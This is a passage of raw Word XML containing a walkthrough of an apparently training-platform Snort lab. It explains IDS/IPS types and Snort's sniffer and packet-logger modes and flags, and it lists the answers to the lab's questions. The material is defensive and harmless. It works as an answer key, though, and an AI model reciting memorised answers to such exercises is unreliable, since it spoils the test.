        <w:t>Task 2: Interactive Material and VM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C5C758" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F7D387D" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Start the machine. Right click the folder and select "Open in terminal here".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51ECCBC1" w14:textId="70DA0797" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Navigate to the Task-Exercises folder and run the command ".</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>/.easy.sh</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>" and write the output</w:t>
      </w:r>
      <w:r w:rsidR="000A02A9">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04519BBC" w14:textId="1696B645" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>Too Easy!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D02EFF" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52A7D336" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Task 3: Introduction to IDS/IPS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B5EB203" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4ADFC613" w14:textId="48385BEB" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">An Intrusion Detection System (IDS) passively monitors network traffic to detect suspicious activities and </w:t>
      </w:r>
      <w:r w:rsidR="000A02A9" w:rsidRPr="006B2109">
        <w:t>generate</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> alerts. It has two types: Network IDS (NIDS), which monitors overall network traffic, and Host-based IDS (HIDS), which focuses on a single device. An Intrusion Prevention System (IPS), on the other hand, actively stops suspicious events by terminating connections. There are also different types of IPS, such as Network IPS (NIPS), </w:t>
      </w:r>
      <w:r w:rsidR="000A02A9" w:rsidRPr="006B2109">
        <w:t>Behavior</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t>-based IPS, Wireless IPS (WIPS), and Host-based IPS (HIPS).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05BEAE75" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F377306" w14:textId="363DFD9F" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">IDS and IPS use three detection and prevention techniques: Signature-based, </w:t>
      </w:r>
      <w:r w:rsidR="00DF508E" w:rsidRPr="006B2109">
        <w:t>Behavior</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t>-based, and Policy-based. IDS identifies threats, but IPS blocks them. Snort is an open-source, rule-based network IDS and IPS that provides live traffic analysis, attack detection, packet logging, and more. It has three modes: Sniffer, Packet Logger, and NIDS/NIPS for detecting and preventing network intrusions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D44BA0C" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20A2246B" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Which snort mode can help you stop the threats on a local machine?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04967712" w14:textId="03FE2AA9" w:rsidR="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>HIPS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C19F1AC" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B629BEC" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Which snort mode can help you detect threats on a local network?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310470EC" w14:textId="7C572A1F" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>NIDS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4EEDC3" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRDefault="000A02A9" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72EC32E3" w14:textId="4A5934E4" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Which snort mode can help you detect the threats on a local machine?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A6929DF" w14:textId="79D7C6AC" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>HIDS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D89AB4" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRDefault="000A02A9" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20DBD702" w14:textId="7E0430FF" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Which snort mode can help you stop the threats on a local network?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD419DB" w14:textId="7A2B8371" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>NIPS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD00EB1" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRDefault="000A02A9" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F4BDAAC" w14:textId="28D87E92" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Which snort mode works </w:t>
      </w:r>
      <w:r w:rsidR="00FA6FE2" w:rsidRPr="006B2109">
        <w:t>like</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> NIPS mode?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C10BFF8" w14:textId="69E5CA9A" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>NBA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521F83AF" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRDefault="000A02A9" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BDA9FD4" w14:textId="2F9A6B9F" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>According to the official description of the snort, what kind of NIPS is it?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A14C0F" w14:textId="569BC445" w:rsidR="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>full-blown</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2007A698" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20EF97C5" w14:textId="5A6AE7B2" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:lastRenderedPageBreak/>
        <w:t>The NBA</w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> training period is also known as ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="229E1C83" w14:textId="795BD005" w:rsidR="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>baselining</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABFBDAA" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00AC9EBB" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Task 4: First Interaction with Snort</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7952295F" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="600A1F9E" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Verify snort is installed using the "snort -V" command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6BCA62" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Verify the configuration file is valid using "-c" to identify the file and "-T" for testing configuration (snort -c /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>/snort/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>snort.conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> -T)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65401792" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="111DAD7A" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Run the Snort instance and check the build number</w:t>
      </w:r>
      <w:r w:rsidR="000A02A9">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="000A02A9" w:rsidRPr="006B2109">
        <w:t>Run "snort -V" to go check for the version number and build.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C277733" w14:textId="03BE5465" w:rsidR="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>149</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D776D8" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FED8149" w14:textId="06993B10" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Test the current instance with "/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>/snort/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>snort.conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>" file and check how many rules are loaded with the current build.</w:t>
      </w:r>
      <w:r w:rsidR="000A02A9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000A02A9" w:rsidRPr="006B2109">
        <w:t>Search for the "Snort rules read" to find out how many rules are loaded with the current build</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5585D883" w14:textId="690BB2C9" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>4151</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2BB1E3" w14:textId="77777777" w:rsidR="000A02A9" w:rsidRDefault="000A02A9" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="666A1840" w14:textId="697CB315" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Test the current instance with "/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>/snort/snortv2.conf" file and check how many rules are loaded with the current build.</w:t>
      </w:r>
      <w:r w:rsidR="000A02A9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000A02A9" w:rsidRPr="006B2109">
        <w:t>Search for "Snort rules read" again to find the number of rules read.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F314F4E" w14:textId="01C94951" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="000A02A9" w:rsidP="000A02A9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A33BF2B" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E39C88A" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Task 5: Operation Mode 1: Sniffer Mode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59CF0988" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76AD9778" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Snort has many ways of viewing metadata about the packet it is ingesting. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C98DA77" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Parameter "-v" displays TCP/IP outputs on the terminal. "-d" shows the payload. Parameter "-e" shows the data-link layer. "-X" displays all content details in HEX. Parameter "-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>" can be used to define a specific network interface to listen and sniff. No answer is required for this task.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F01FB73" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A1813C3" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Task 6: Operation Mode 2: Packet Logger Mode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68BB0763" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A176237" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Snort can be used to log sniffed packets with logger mode. There are a few parameters that come with Packet Logger Mode.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1FBE7C" w14:textId="2B7A25AE" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">"-l" is used to target log and alert output directory. "-K ASCII" logs packets in ASCII format. Parameter "-r" reads the dumped logs in Snort. "-n" specifies the number of packets that will </w:t>
      </w:r>
      <w:r w:rsidR="00FA6FE2" w:rsidRPr="006B2109">
        <w:t>be processed</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DB611B" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
